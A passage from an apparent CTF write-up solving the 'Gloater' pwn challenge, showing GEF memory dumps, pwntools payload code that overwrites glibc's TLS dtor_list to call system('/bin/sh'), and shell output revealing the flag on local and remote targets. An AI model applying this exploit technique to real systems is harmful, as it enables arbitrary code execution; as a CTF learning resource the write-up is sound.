    0x7f443d281550|+0x0010|+002: 0x00007f443d281540  ->  [loop detected]
    0x7f443d281558|+0x0018|+003: 0x0000000000000000
    0x7f443d281560|+0x0020|+004: 0x0000000000000000
    0x7f443d281568|+0x0028|+005: 0x003fe0e03aa30100  <-  canary
    0x7f443d281570|+0x0030|+006: 0xe6a7e152dbcd2717  <-  PTR_MANGLE cookie
    0x7f443d281578|+0x0038|+007: 0x0000000000000000
    0x7f443d281580|+0x0040|+008: 0x0000000000000000
    0x7f443d281588|+0x0048|+009: 0x0000000000000000
    0x7f443d281590|+0x0050|+010: 0x0000000000000000
    0x7f443d281598|+0x0058|+011: 0x0000000000000000
    0x7f443d2815a0|+0x0060|+012: 0x0000000000000000
    0x7f443d2815a8|+0x0068|+013: 0x0000000000000000
    0x7f443d2815b0|+0x0070|+014: 0x0000000000000000
    0x7f443d2815b8|+0x0078|+015: 0x0000000000000000
    gef> p/x $tls - $libc
    $3 = 0x1f3540
```

`

For this technique to work, we need to set a pointer to a chunk containing a mangled function address, and a list of arguments. Then, we will use null bytes to overwrite the `PTR_MANGLE cookie`, so that the mangling operation is just a logical bit-shift:

`

```
        create_new_taunt(b'A' * 8, b'B' * 0x118) 
    
        tls_payload  = p64(tls_addr - 0x80 + 0x30)
        tls_payload += p64(glibc.sym.system << 17)
        tls_payload += p64(next(glibc.search(b'/bin/sh')))
        tls_payload += p64(0) * 8
        tls_payload += p64(glibc.address + 0x1f3540)
        tls_payload += p64(glibc.address + 0x1f3ea0)
        tls_payload += p64(glibc.address + 0x1f3540)
        tls_payload += p64(0) * 4
    
        create_new_taunt(b'A' * 8, tls_payload.ljust(0x118, b'\0')) 
        io.sendlineafter(b'> ', b'6')
```

`

For more information on this technique, you can read [nobodyisnobody’s GitHub repository](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#5---code-execution-via-tls-storage-dtor_list-overwrite) or [Zombiedote](https://7rocky.github.io/en/ctf/other/htb-unictf/zombiedote).

With this, we use the arbitrary write primitive from Tcache poisoning to modify the TLS-storage:

`

```
    gef> tls
    $tls = 0x7f443d281540
    ------------------------------------------------------------------------------------ TLS-0x80 ------------------------------------------------------------------------------------
    0x7f443d2814c0|+0x0000|+000: 0x0000000000000000
    0x7f443d2814c8|+0x0008|+001: 0x00007f443d2294c0  ->  0x0000000100000000
    0x7f443d2814d0|+0x0010|+002: 0x00007f443d229ac0  ->  0x0000000100000000
    0x7f443d2814d8|+0x0018|+003: 0x00007f443d22a3c0  ->  0x0002000200020002
    0x7f443d2814e0|+0x0020|+004: 0x0000000000000000
    0x7f443d2814e8|+0x0028|+005: 0x00007f443d2814f0  ->  0xfe887a1c05200000
    0x7f443d2814f0|+0x0030|+006: 0xfe887a1c05200000
    0x7f443d2814f8|+0x0038|+007: 0x00007f443d2425bd  ->  0x0068732f6e69622f ('/bin/sh'?)
    0x7f443d281500|+0x0040|+008: 0x0000000000000000
    0x7f443d281508|+0x0048|+009: 0x0000000000000000
    0x7f443d281510|+0x0050|+010: 0x0000000000000000
    0x7f443d281518|+0x0058|+011: 0x0000000000000000
    0x7f443d281520|+0x0060|+012: 0x0000000000000000
    0x7f443d281528|+0x0068|+013: 0x0000000000000000
    0x7f443d281530|+0x0070|+014: 0x0000000000000000
    0x7f443d281538|+0x0078|+015: 0x0000000000000000
    -------------------------------------------------------------------------------------- TLS --------------------------------------------------------------------------------------
    0x7f443d281540|+0x0000|+000: 0x00007f443d281540  ->  [loop detected]
    0x7f443d281548|+0x0008|+001: 0x00007f443d281ea0  ->  0x0000000000000001
    0x7f443d281550|+0x0010|+002: 0x00007f443d281540  ->  [loop detected]
    0x7f443d281558|+0x0018|+003: 0x0000000000000000
    0x7f443d281560|+0x0020|+004: 0x0000000000000000
    0x7f443d281568|+0x0028|+005: 0x0000000000000000
    0x7f443d281570|+0x0030|+006: 0x0000000000000000
    0x7f443d281578|+0x0038|+007: 0x0000000000000000
    0x7f443d281580|+0x0040|+008: 0x0000000000000000
    0x7f443d281588|+0x0048|+009: 0x0000000000000000
    0x7f443d281590|+0x0050|+010: 0x0000000000000000
    0x7f443d281598|+0x0058|+011: 0x0000000000000000
    0x7f443d2815a0|+0x0060|+012: 0x0000000000000000
    0x7f443d2815a8|+0x0068|+013: 0x0000000000000000
    0x7f443d2815b0|+0x0070|+014: 0x0000000000000000
    0x7f443d2815b8|+0x0078|+015: 0x0000000000000000
```

`

At this point, we can use option `6` to exit the program, so that our TLS-storage `dtor_list` payload calls `system("/bin/sh")` and we get a shell:

`

```
    [*] Switching to interactive mode
    $ ls
    flag.txt
    gloater
    run.sh
    $ cat flag.txt
    HTB{f4k3_fL4g_f0R_t3sTiNg}
```

`

## Flag

Let’s go remote:

`

```
    $ python3 solve.py 94.237.54.170:58631
    [*] './gloater'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      PIE enabled
        RUNPATH:  b'.'
    [+] Opening connection to 94.237.54.170 on port 58631: Done
    [+] Glibc base address: 0x7f10e7394000
    [*] Switching to interactive mode
    $ ls
    flag.txt
    gloater
    run.sh
    $ cat flag.txt
    HTB{gL0aT_aLl_y0u_l1k3,c0mb4t_cHoOsES_tH3_viCt0rS}
```

`

The full exploit code is here: [`solve.py`](https://github.com/7Rocky/CTF-scripts/tree/main/HTB%20Cyber%20Apocalypse/Pwn/Gloater/solve.py).
